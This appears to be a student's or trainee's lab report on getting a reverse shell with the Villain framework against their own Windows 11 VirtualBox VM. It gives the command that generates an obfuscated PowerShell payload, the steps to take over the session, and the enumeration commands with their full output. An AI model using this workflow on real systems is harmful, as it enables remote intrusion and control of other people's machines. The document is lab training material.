# Villain Framework Reverse Shell Report

## ⚙️ Setup Info
- Payload: `windows/reverse_tcp/powershell`
- LHOST: `192.168.221.3`
- LPORT: `8080`

## 🔁 Payload Delivery Method

The payload was generated using Villain with the following command:

```bash
generate payload=windows/hoaxshell/powershell_iex lhost=eth1 obfuscate
```
This produced an obfuscated PowerShell payload, which was then executed directly in the target Windows VM's PowerShell console.

After execution, the session was confirmed by running:

```bash
sessions
```
The session ID for the newly established connection was noted, and PowerShell terminal access was obtained using:

```bash
shell 8b5b07-a63f43-6400ef
```
From this interactive shell, the following commands were executed to enumerate the target system:

`whoami` — Identified the current user.

`ipconfig` — Retrieved the IP address configuration.

`hostname` — Captured the machine's hostname.

`systeminfo` — Collected detailed system information.

## 🖥️ Captured Info
- Hostname: `Windows-11`
- IP Address: `192.168.221.4`
- User: `kali`

## 🔎 Enumeration Performed
```powershell
> whoami
windows-11\kali

> ipconfig
Windows IP Configuration                                                                                                           
                                                                                                                                   
                                                                                                                                   
Ethernet adapter Ethernet:                                                                                                         
                                                                                                                                   
   Connection-specific DNS Suffix  . :                                                                                             
   IPv6 Address. . . . . . . . . . . : fd00::aefd:7688:5b75:ae34                                                                   
   Temporary IPv6 Address. . . . . . : fd00::99b9:fb91:aa28:215b                                                                   
   Link-local IPv6 Address . . . . . : fe80::ba7a:a88b:4ea:da52%15                                                                 
   IPv4 Address. . . . . . . . . . . : 10.0.2.15                                                                                   
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                               
   Default Gateway . . . . . . . . . : fe80::2%15                                                                                  
                                       10.0.2.2                                                                                    
                                                                                                                                   
Ethernet adapter Ethernet 2:                                                                                                       
                                                                                                                                   
   Connection-specific DNS Suffix  . :                                                                                             
   Link-local IPv6 Address . . . . . : fe80::6d65:acbe:e7e1:4aa%7                                                                  
   IPv4 Address. . . . . . . . . . . : 192.168.221.4                                                                               
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                               
   Default Gateway . . . . . . . . . :                           

> systeminfo
Host Name:                     WINDOWS-11
OS Name:                       Microsoft Windows 11 Home                                                                           
OS Version:                    10.0.26100 N/A Build 26100                                                                          
OS Manufacturer:               Microsoft Corporation                                                                               
OS Configuration:              Standalone Workstation                                                                              
OS Build Type:                 Multiprocessor Free                                                                                 
Registered Owner:              N/A                                                                                                 
Registered Organization:       N/A                                                                                                 
Product ID:                    00326-10000-00000-AA689                                                                             
Original Install Date:         8/11/2025, 11:43:35 PM                                                                              
System Boot Time:              8/13/2025, 11:44:55 PM                                                                              
System Manufacturer:           innotek GmbH                                                                                        
System Model:                  VirtualBox                                                                                          
System Type:                   x64-based PC                                                                                        
Processor(s):                  1 Processor(s) Installed.                                                                           
                               [01]: Intel64 Family 6 Model 186 Stepping 2 GenuineIntel ~2995 Mhz                                  
BIOS Version:                  innotek GmbH VirtualBox, 12/1/2006                                                                  
Windows Directory:             C:\WINDOWS                                                                                          
System Directory:              C:\WINDOWS\system32                                                                                 
Boot Device:                   \Device\HarddiskVolume2                                                                             
System Locale:                 en-us;English (United States)                                                                       
Input Locale:                  en-us;English (United States)                                                                       
Time Zone:                     (UTC+05:30) Chennai, Kolkata, Mumbai, New Delhi                                                     
Total Physical Memory:         4,078 MB                                                                                            
Available Physical Memory:     1,445 MB                                                                                            
Virtual Memory: Max Size:      5,486 MB                                                                                            
Virtual Memory: Available:     2,785 MB                                                                                            
Virtual Memory: In Use:        2,701 MB                                                                                            
Page File Location(s):         C:\pagefile.sys                                                                                     
Domain:                        WORKGROUP                                                                                           
Logon Server:                  \\WINDOWS-11                                                                                        
Hotfix(s):                     3 Hotfix(s) Installed.                                                                              
                               [01]: KB5042098                                                                                     
                               [02]: KB5043080                                                                                     
                               [03]: KB5043113                                                                                     
Network Card(s):               2 NIC(s) Installed.                                                                                 
                               [01]: Intel(R) PRO/1000 MT Desktop Adapter                                                          
                                     Connection Name: Ethernet                                                                     
                                     DHCP Enabled:    Yes                                                                          
                                     DHCP Server:     10.0.2.2                                                                     
                                     IP address(es)                                                                                
                                     [01]: 10.0.2.15                                                                               
                                     [02]: fe80::ba7a:a88b:4ea:da52                                                                
                                     [03]: fd00::99b9:fb91:aa28:215b                                                               
                                     [04]: fd00::aefd:7688:5b75:ae34                                                               
                               [02]: Intel(R) PRO/1000 MT Desktop Adapter                                                          
                                     Connection Name: Ethernet 2                                                                   
                                     DHCP Enabled:    Yes                                                                          
                                     DHCP Server:     192.168.221.2                                                                
                                     IP address(es)                                                                                
                                     [01]: 192.168.221.4                                                                           
                                     [02]: fe80::6d65:acbe:e7e1:4aa                                                                
Virtualization-based security: Status: Not enabled                                                                                 
                               App Control for Business policy: Enforced                                                           
                               App Control for Business user mode policy: Audit                                                    
                               Security Features Enabled:                                                                          
Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.      
